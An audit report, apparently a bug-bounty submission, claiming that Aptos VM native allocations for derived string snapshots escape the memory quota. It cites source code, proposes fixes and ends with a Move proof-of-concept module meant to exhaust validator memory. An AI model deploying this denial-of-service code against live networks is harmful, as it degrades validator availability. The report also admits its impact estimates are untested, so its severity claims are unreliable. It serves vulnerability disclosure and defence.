# Audit Report

## Title
Untracked Native Memory Allocation for Speculative DelayedFieldValue::Derived Instances Enables Memory Exhaustion DoS

## Summary
Speculative `DelayedFieldValue::Derived` instances created during transaction execution are stored in native Rust data structures (BTreeMap) whose memory consumption is not tracked by the VM's memory quota system, enabling potential memory exhaustion attacks on validator nodes.

## Finding Description

The `get_approximate_memory_size()` function correctly calculates memory size for `DelayedFieldValue` instances, but this function is **only invoked for base values from storage**, not for speculative values created during transaction execution. [1](#0-0) 

The function is called exclusively in `set_base_value()` for delayed fields loaded from storage: [2](#0-1) 

However, when transactions create new `DelayedFieldValue::Derived` instances via `create_new_derived()`, they are stored in a native BTreeMap without any memory tracking: [3](#0-2) 

This BTreeMap is part of `DelayedFieldData` structure: [4](#0-3) 

The `MemoryTrackedGasMeter` only tracks Move VM heap allocations, not native Rust allocations like the delayed_fields BTreeMap: [5](#0-4) 

**Attack Path:**

1. Attacker submits transactions that create multiple Move resources containing `DerivedStringSnapshot` fields
2. Each resource can contain up to 10 delayed fields (MAX_DELAYED_FIELDS_PER_RESOURCE): [6](#0-5) 

3. Each delayed field can be up to 1024 bytes: [7](#0-6) 

4. Maximum write operations per transaction is 8192: [8](#0-7) 

5. Theoretical maximum per transaction: 8192 resources × 10 delayed fields × 1024 bytes ≈ 80 MB of untracked native memory

The native functions that create derived strings do not trigger memory quota checks: [9](#0-8) 

## Impact Explanation

This constitutes a **Medium severity** DoS vulnerability per Aptos bug bounty criteria. While individual transactions are constrained by gas limits (which may prevent reaching the theoretical 80 MB limit), multiple concurrent transactions can collectively exhaust validator node memory since:

1. Each transaction allocates native memory not tracked by `memory_quota` (10 MB Move VM heap limit)
2. During parallel execution, multiple transactions simultaneously allocate this untracked native memory
3. This violates the "Resource Limits" invariant: "All operations must respect gas, storage, and computational limits"

The attack causes validator node slowdowns or crashes due to memory exhaustion, impacting network availability without requiring byzantine validator behavior.

## Likelihood Explanation

**Likelihood: Medium-High**

The attack requires:
- Standard transaction submission (no special privileges)
- Multiple concurrent transactions to amplify impact
- Each transaction creates resources with derived string snapshots

Constraints that limit but don't prevent exploitation:
- Gas consumption for resource creation and native function calls
- Execution time limits
- Per-transaction write operation limits (8192)

However, even partial exploitation (e.g., 1000 resources × 10 fields × 1024 bytes ≈ 10 MB per transaction) across concurrent transactions can cause memory pressure during high network load.

## Recommendation

Add memory tracking for speculative delayed field allocations in the delayed_fields BTreeMap. Options include:

1. **Track native allocations in MemoryTrackedGasMeter**: Extend the memory quota system to account for native data structure allocations during delayed field operations.

2. **Add per-transaction delayed field memory limit**: Implement a separate quota for total delayed field memory, checked in `create_new_derived()` and other delayed field creation functions.

3. **Charge gas proportional to delayed field size**: Increase gas charges for creating derived string snapshots to account for native memory allocation.

Example fix in `create_new_derived()`:

```rust
pub fn create_new_derived(
    &mut self,
    value: Vec<u8>,
    resolver: &dyn DelayedFieldResolver,
) -> PartialVMResult<DelayedFieldID> {
    // Check against delayed field memory budget
    let new_size = value.len();
    if self.total_delayed_field_memory + new_size > MAX_DELAYED_FIELD_MEMORY_PER_TXN {
        return Err(code_invariant_error("Delayed field memory quota exceeded"));
    }
    self.total_delayed_field_memory += new_size;
    
    // ... existing code ...
}
```

## Proof of Concept

```move
module attacker::memory_exhaust {
    use aptos_framework::aggregator_v2;
    use std::string;

    struct ResourceWithDerivedFields has key {
        field1: aggregator_v2::DerivedStringSnapshot,
        field2: aggregator_v2::DerivedStringSnapshot,
        field3: aggregator_v2::DerivedStringSnapshot,
        field4: aggregator_v2::DerivedStringSnapshot,
        field5: aggregator_v2::DerivedStringSnapshot,
        field6: aggregator_v2::DerivedStringSnapshot,
        field7: aggregator_v2::DerivedStringSnapshot,
        field8: aggregator_v2::DerivedStringSnapshot,
        field9: aggregator_v2::DerivedStringSnapshot,
        field10: aggregator_v2::DerivedStringSnapshot,
    }

    public entry fun exhaust_memory(account: &signer) {
        // Create large string (1024 bytes)
        let large_string = string::utf8(vector[/* 1024 'A' bytes */]);
        
        // Create many resources, each with 10 DerivedStringSnapshot fields
        // Limited by max_write_ops_per_transaction (8192) and gas
        let i = 0;
        while (i < 1000) {  // Adjust based on gas limits
            let resource = ResourceWithDerivedFields {
                field1: aggregator_v2::create_derived_string(copy large_string),
                field2: aggregator_v2::create_derived_string(copy large_string),
                field3: aggregator_v2::create_derived_string(copy large_string),
                field4: aggregator_v2::create_derived_string(copy large_string),
                field5: aggregator_v2::create_derived_string(copy large_string),
                field6: aggregator_v2::create_derived_string(copy large_string),
                field7: aggregator_v2::create_derived_string(copy large_string),
                field8: aggregator_v2::create_derived_string(copy large_string),
                field9: aggregator_v2::create_derived_string(copy large_string),
                field10: aggregator_v2::create_derived_string(large_string),
            };
            move_to(account, resource);
            i = i + 1;
        }
        // This allocates ~10 MB of untracked native memory per transaction
        // Multiple concurrent transactions amplify the effect
    }
}
```

## Notes

The vulnerability is constrained by gas and execution limits, preventing "millions" of instances in a single transaction. However, the core issue remains valid: native memory allocations for speculative delayed fields bypass the memory quota system designed to prevent resource exhaustion attacks. The practical impact depends on gas consumption rates and concurrent transaction load, which requires empirical testing to quantify precisely.

### Citations

**File:** aptos-move/aptos-aggregator/src/types.rs (L176-184)
```rust
    pub fn get_approximate_memory_size(&self) -> usize {
        // 32 + len
        std::mem::size_of::<DelayedFieldValue>()
            + match &self {
                DelayedFieldValue::Aggregator(_) | DelayedFieldValue::Snapshot(_) => 0,
                // additional allocated memory for the data:
                DelayedFieldValue::Derived(v) => v.len(),
            }
    }
```

**File:** aptos-move/mvhashmap/src/versioned_delayed_fields.rs (L443-450)
```rust
    pub fn set_base_value(&self, id: K, base_value: DelayedFieldValue) {
        self.values.entry(id).or_insert_with(|| {
            self.total_base_value_size.fetch_add(
                base_value.get_approximate_memory_size() as u64,
                Ordering::Relaxed,
            );
            VersionedValue::new(Some(base_value))
        });
```

**File:** aptos-move/aptos-aggregator/src/delayed_field_extension.rs (L32-35)
```rust
pub struct DelayedFieldData {
    // All aggregator instances that exist in the current transaction.
    delayed_fields: BTreeMap<DelayedFieldID, DelayedChange<DelayedFieldID>>,
}
```

**File:** aptos-move/aptos-aggregator/src/delayed_field_extension.rs (L235-250)
```rust
    pub fn create_new_derived(
        &mut self,
        value: Vec<u8>,
        resolver: &dyn DelayedFieldResolver,
    ) -> PartialVMResult<DelayedFieldID> {
        // cast shouldn't fail because we assert on low limit for value before this call.
        let width =
            u32::try_from(calculate_width_for_constant_string(value.len())).map_err(|_| {
                code_invariant_error("Calculated DerivedStringSnapshot width exceeds u32")
            })?;
        let change = DelayedChange::Create(DelayedFieldValue::Derived(value));
        let snapshot_id = resolver.generate_delayed_field_id(width);

        self.delayed_fields.insert(snapshot_id, change);
        Ok(snapshot_id)
    }
```

**File:** aptos-move/aptos-memory-usage-tracker/src/lib.rs (L48-63)
```rust
    fn use_heap_memory(&mut self, amount: AbstractValueSize) -> PartialVMResult<()> {
        if self.feature_version >= 3 {
            match self.remaining_memory_quota.checked_sub(amount) {
                Some(remaining_quota) => {
                    self.remaining_memory_quota = remaining_quota;
                    Ok(())
                },
                None => {
                    self.remaining_memory_quota = 0.into();
                    Err(PartialVMError::new(StatusCode::MEMORY_LIMIT_EXCEEDED))
                },
            }
        } else {
            Ok(())
        }
    }
```

**File:** third_party/move/move-vm/types/src/value_serde.rs (L54-54)
```rust
    const MAX_DELAYED_FIELDS_PER_RESOURCE: usize = 10;
```

**File:** aptos-move/framework/src/natives/aggregator_natives/aggregator_v2.rs (L54-54)
```rust
pub const DERIVED_STRING_INPUT_MAX_LENGTH: usize = 1024;
```

**File:** aptos-move/framework/src/natives/aggregator_natives/aggregator_v2.rs (L490-521)
```rust
fn native_create_derived_string(
    context: &mut SafeNativeContext,
    ty_args: &[Type],
    mut args: VecDeque<Value>,
) -> SafeNativeResult<SmallVec<[Value; 1]>> {
    debug_assert_eq!(ty_args.len(), 0);
    debug_assert_eq!(args.len(), 1);
    context.charge(AGGREGATOR_V2_CREATE_SNAPSHOT_BASE)?;

    let value_bytes = string_to_bytes(safely_pop_arg!(args, Struct))
        .map_err(SafeNativeError::InvariantViolation)?;
    context
        .charge(AGGREGATOR_V2_CREATE_SNAPSHOT_PER_BYTE * NumBytes::new(value_bytes.len() as u64))?;

    if value_bytes.len() > DERIVED_STRING_INPUT_MAX_LENGTH {
        return Err(SafeNativeError::Abort {
            abort_code: EINPUT_STRING_LENGTH_TOO_LARGE,
        });
    }

    let derived_string_snapshot =
        if let Some((resolver, mut delayed_field_data)) = get_context_data(context) {
            let id = delayed_field_data.create_new_derived(value_bytes, resolver)?;
            Value::delayed_value(id)
        } else {
            let width = calculate_width_for_constant_string(value_bytes.len());
            bytes_and_width_to_derived_string_struct(value_bytes, width)
                .map_err(SafeNativeError::InvariantViolation)?
        };

    Ok(smallvec![derived_string_snapshot])
}
```

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/transaction.rs (L174-177)
```rust
            max_write_ops_per_transaction: NumSlots,
            { 11.. => "max_write_ops_per_transaction" },
            8192,
        ],
```
